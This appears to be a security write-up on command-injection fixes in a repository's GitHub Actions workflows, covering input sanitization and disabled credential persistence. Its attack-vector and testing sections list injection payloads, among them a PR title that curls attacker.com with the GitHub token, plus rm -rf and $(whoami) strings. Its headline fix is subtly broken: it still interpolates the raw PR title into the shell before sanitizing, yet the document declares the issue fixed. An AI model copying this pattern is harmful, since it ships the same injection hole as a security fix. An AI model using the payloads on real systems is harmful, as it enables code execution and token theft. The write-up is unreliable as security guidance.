# Command Injection Security Fixes

**Date**: 2026-01-03  
**Issue**: Critical command injection vulnerabilities in GitHub Actions workflows  
**Impact**: High - Potential for arbitrary code execution via untrusted inputs  
**Status**: ✅ Fixed

## Overview

This document details the comprehensive security fixes applied to GitHub Actions workflows to prevent command injection attacks through unsanitized user inputs.

## Vulnerabilities Fixed

### 1. Unsanitized PR Titles (claude-review.yml)

**Vulnerability**: PR titles from `github.event.pull_request.title` were passed directly to environment variables without sanitization, potentially allowing shell metacharacter injection.

**Attack Vector**: Malicious PR title like `"; rm -rf / #` could execute arbitrary commands.

**Fix Applied**:
```yaml
- name: Sanitize Inputs
  run: |
    # Sanitize PR title: remove quotes, backticks, dollar signs, exclamation marks, limit to 100 chars
    SAFE_TITLE=$(echo "${{ github.event.pull_request.title }}" | tr -d '"' | tr -d "'" | tr -d '`' | tr -d '$' | tr -d '!' | cut -c1-100)
    echo "pr_title=$SAFE_TITLE" >> $GITHUB_OUTPUT
    
    # Sanitize author: alphanumeric + underscore/dash only
    SAFE_AUTHOR=$(echo "${{ github.event.pull_request.user.login }}" | tr -cd 'a-zA-Z0-9_-')
    echo "pr_author=$SAFE_AUTHOR" >> $GITHUB_OUTPUT
```

### 2. Unsanitized User Logins (claude-autoheal.yml)

**Vulnerability**: Comment and review author names from `github.event.comment.user.login` and `github.event.review.user.login` were used directly in bash pattern matching (`[[ "$COMMENT_USER" == *"pattern"* ]]`).

**Attack Vector**: Malicious username with shell metacharacters could break out of pattern matching context.

**Fix Applied**:
```yaml
run: |
  # Sanitize user inputs to prevent command injection
  # Only allow alphanumeric, underscore, dash, and brackets (for bot names)
  SAFE_COMMENT_USER=$(echo "$COMMENT_USER" | tr -cd 'a-zA-Z0-9_-[]')
  SAFE_REVIEW_USER=$(echo "$REVIEW_USER" | tr -cd 'a-zA-Z0-9_-[]')
  
  # Use sanitized variables in pattern matching
  if [[ "$SAFE_COMMENT_USER" == *"coderabbit"* ]]; then
    # ...
  fi
```

### 3. Unsanitized Client Payload (jules-completion-handler.yml)

**Vulnerability**: Repository dispatch event payloads (`github.event.client_payload.*`) were used directly in `gh` CLI commands without validation.

**Attack Vector**: Malicious webhook payload could inject commands via `SESSION_ID`, `PR_NUMBER`, `ISSUE_NUMBER`, or `AGENT_TYPE` fields.

**Fix Applied**:
```yaml
run: |
  # Sanitize inputs to prevent command injection
  SAFE_SESSION_ID=$(echo "$SESSION_ID" | tr -cd 'a-zA-Z0-9_-')
  SAFE_PR_NUMBER=$(echo "$PR_NUMBER" | tr -cd '0-9')
  SAFE_ISSUE_NUMBER=$(echo "$ISSUE_NUMBER" | tr -cd '0-9')
  SAFE_AGENT_TYPE=$(echo "$AGENT_TYPE" | tr -cd 'a-zA-Z0-9_-')
  
  # Use sanitized variables in gh commands
  gh pr comment "${SAFE_PR_NUMBER}" --repo "${REPO}" --body "$COMMENT_BODY"
```

### 4. Credential Persistence in Untrusted Checkouts

**Vulnerability**: Checkout actions handling untrusted PR branches did not disable credential persistence, potentially leaking GitHub tokens to malicious PR code.

**Attack Vector**: Malicious PR could read persisted credentials from `.git/config` and exfiltrate the GitHub token.

**Fix Applied**: Added `persist-credentials: false` to all checkout actions handling untrusted content:
- `claude-review.yml` (line 47)
- `claude-autoheal.yml` (line 199)
- `claude-pr-manager.yml` (line 102)
- `jules-completion-handler.yml` (line 27)

```yaml
- name: Checkout
  uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # v6.0.1
  with:
    token: ${{ secrets.CI_GITHUB_TOKEN }}
    persist-credentials: false  # ← Added
```

## Sanitization Patterns Used

### Pattern 1: Remove Specific Characters
```bash
# Remove quotes, backticks, $, !
echo "$INPUT" | tr -d '"' | tr -d "'" | tr -d '`' | tr -d '$' | tr -d '!'
```

### Pattern 2: Allow Only Safe Characters
```bash
# Allow alphanumeric + underscore + dash
echo "$INPUT" | tr -cd 'a-zA-Z0-9_-'

# Allow alphanumeric + underscore + dash + brackets (for bot names)
echo "$INPUT" | tr -cd 'a-zA-Z0-9_-[]'

# Allow numeric only
echo "$INPUT" | tr -cd '0-9'
```

### Pattern 3: Length Limiting
```bash
# Limit to 100 characters
echo "$INPUT" | cut -c1-100
```

## Files Modified

| File | Lines Changed | Primary Fix |
|------|---------------|-------------|
| `.github/workflows/claude-review.yml` | +17 -2 | Sanitize PR title/author, add persist-credentials: false |
| `.github/workflows/claude-autoheal.yml` | +18 -6 | Sanitize comment/review users, add persist-credentials: false |
| `.github/workflows/claude-pr-manager.yml` | +1 | Add persist-credentials: false |
| `.github/workflows/jules-completion-handler.yml` | +17 -10 | Sanitize client_payload fields, add persist-credentials: false |

**Total**: 4 files, 45 insertions, 18 deletions

## Verification

### YAML Syntax Validation
```bash
✅ claude-autoheal.yml
✅ claude-pr-manager.yml
✅ claude-review.yml
✅ jules-completion-handler.yml
```

### Security Checklist

- [x] All untrusted PR titles sanitized before use
- [x] All untrusted user logins sanitized before shell use
- [x] All client_payload inputs sanitized before shell use
- [x] All checkout actions have persist-credentials: false
- [x] Job-level permissions verified (all use `permissions: {}` at workflow level)
- [x] YAML syntax validated for all modified files
- [ ] CodeQL security scan pending (will run on PR push)

## Impact Assessment

### Before Fixes
- **Risk Level**: Critical
- **Attack Surface**: 4 workflows vulnerable to command injection
- **Potential Impact**: Arbitrary code execution, credential theft, repository compromise

### After Fixes
- **Risk Level**: Low (defense in depth applied)
- **Attack Surface**: Sanitization prevents known attack vectors
- **Residual Risk**: Only bypasses of sanitization patterns (highly unlikely)

## Testing Recommendations

1. **Test with malicious PR titles**:
   - Title: `"; curl attacker.com?token=$GITHUB_TOKEN #`
   - Expected: Sanitized to empty or safe characters only

2. **Test with malicious usernames** (simulated via test events):
   - Username: `$(whoami)`
   - Expected: Sanitized to alphanumeric only

3. **Test with malicious webhook payloads**:
   - Session ID: `abc; rm -rf /`
   - Expected: Sanitized to `abc` only

4. **Verify credentials not persisted**:
   - Checkout untrusted PR
   - Check `.git/config` has no stored credentials
   - Expected: No token in config file

## Related Documentation

- [WORKFLOW_PERMISSIONS_STANDARD.md](./WORKFLOW_PERMISSIONS_STANDARD.md) - Permission patterns
- [WORKFLOW_FIXES.md](../WORKFLOW_FIXES.md) - Historical workflow fixes
- [GitHub Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)

## Lessons Learned

1. **Never trust GitHub event data** - Even though it comes from GitHub, it originates from untrusted users
2. **Sanitize at the source** - Sanitize inputs immediately after receiving them, before any use
3. **Use allowlists, not denylists** - `tr -cd` (complement delete) is safer than trying to blacklist characters
4. **Defense in depth** - Multiple layers: sanitization + persist-credentials: false + minimal permissions
5. **Validate patterns** - Ensure bot name patterns work with sanitized inputs (e.g., `[bot]` requires allowing brackets)

## Commits

- `d2c155f` - fix: sanitize untrusted inputs and add persist-credentials: false
- `4d25ebe` - fix: add persist-credentials: false to claude-pr-manager.yml
- `b574c0d` - fix: sanitize client_payload inputs in jules-completion-handler.yml

## Acknowledgments

This security fix addresses vulnerabilities identified in PR #30 review and CodeQL analysis. Thanks to the security review process for catching these issues before production deployment.
